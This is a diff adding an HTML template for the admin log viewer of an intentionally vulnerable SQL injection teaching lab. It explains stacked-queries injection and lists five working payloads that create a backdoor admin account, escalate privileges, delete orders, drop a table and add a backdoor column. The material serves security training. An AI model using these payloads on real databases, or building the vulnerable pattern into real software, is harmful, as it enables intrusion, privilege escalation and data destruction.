@@ -1,0 +1,99 @@
+{% extends "base.html" %}
+
+{% block title %}Admin Panel - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">⚡ Admin Log Viewer</span>
+        <span class="badge badge-danger">Vulnerable: Stacked Queries SQLi</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+        This endpoint is vulnerable to <strong>Stacked Queries SQL Injection</strong>.
+        It uses <code>executescript()</code> which allows multiple SQL statements separated by semicolons.
+        <span style="color: var(--danger);"><strong>WARNING: This can modify or destroy data!</strong></span>
+    </p>
+    <form method="GET" action="{{ url_for('admin') }}">
+        <div style="display: flex; gap: 12px;">
+            <input type="text" name="filter" value="{{ log_filter }}" placeholder="Filter condition (e.g., action='INIT')..." style="flex: 1;">
+            <button type="submit" class="btn btn-primary">View Logs</button>
+        </div>
+    </form>
+    {% if executed_query %}
+    <div class="query-box">
+        <span class="label">Executed SQL Query</span>
+        <code>{{ executed_query }}</code>
+    </div>
+    {% endif %}
+    {% if error %}
+        <div class="alert alert-danger">{{ error }}</div>
+    {% endif %}
+</div>
+
+{% if results %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">System Logs ({{ results|length }} entries)</span>
+    </div>
+    <table class="data-table">
+        <thead>
+            <tr><th>ID</th><th>Action</th><th>Details</th><th>Time</th></tr>
+        </thead>
+        <tbody>
+            {% for row in results %}
+            <tr>
+                <td>{{ row.id }}</td>
+                <td><span class="badge badge-info">{{ row.action }}</span></td>
+                <td>{{ row.details }}</td>
+                <td>{{ row.log_time }}</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+{% endif %}
+
+<div class="card" style="border-color: var(--danger);">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--danger);">💉 Stacked Queries Payloads</span>
+        <span class="badge badge-danger">DATA DESTRUCTION RISK</span>
+    </div>
+    <div style="background: rgba(248, 81, 73, 0.1); border: 1px solid rgba(248, 81, 73, 0.3); border-radius: 8px; padding: 12px; margin-bottom: 16px;">
+        <strong style="color: var(--danger);">⚠️ WARNING:</strong> These payloads can permanently modify or delete data. 
+        Use the <a href="{{ url_for('reset_db') }}" style="color: var(--danger);">Reset Database</a> button to restore.
+    </div>
+    <div class="payload">
+        <div class="payload-label">Add a new admin user (persistence attack)</div>
+        1=1; INSERT INTO users (username, password, email, role) VALUES ('hacker', 'hacked123', 'hacker@evil.com', 'admin'); --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Promote existing user to admin</div>
+        1=1; UPDATE users SET role='admin' WHERE username='alice'; --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Delete all orders (denial of service)</div>
+        1=1; DELETE FROM orders; --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Drop the feedback table (destruction)</div>
+        1=1; DROP TABLE feedback; --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Alter table to add backdoor column</div>
+        1=1; ALTER TABLE users ADD COLUMN backdoor TEXT DEFAULT 'compromised'; --
+    </div>
+</div>
+
+<div class="card" style="border-color: var(--info);">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--info);">🔬 Why Stacked Queries Are Dangerous</span>
+    </div>
+    <ul style="padding-left: 20px; color: var(--text-muted); font-size: 13px; line-height: 1.8;">
+        <li>Most SQL injection only reads data — stacked queries allow <strong>data modification</strong></li>
+        <li>Attackers can create persistent backdoor accounts even after the original vulnerability is patched</li>
+        <li>Can be used for privilege escalation, data destruction, or planting evidence</li>
+        <li>Not all database drivers support stacked queries (SQLite <code>executescript()</code> does)</li>
+        <li>In MySQL with <code>mysqli_multi_query()</code> and MSSQL with <code>;</code> separators</li>
+    </ul>
+</div>
+{% endblock %}
